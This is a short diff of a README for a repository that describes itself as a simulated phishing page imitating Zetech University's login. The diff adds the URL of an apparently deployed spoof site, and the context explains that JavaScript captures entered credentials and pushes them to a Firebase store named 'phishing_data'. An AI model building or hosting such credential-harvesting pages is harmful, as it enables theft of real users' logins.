@@ -32,6 +32,7 @@ This repository contains a simulated phishing page that mimics Zetech University
 Firebase was used to store phished credentials in real-time. Here's how it works:
 
 1. The user enters their credentials on the spoofed page.
+ ```https://elearning-zetech-ac.netlify.app```
 2. JavaScript captures the input and writes it to the Firebase database:
     ```js
     firebase.database().ref('phishing_data').push({
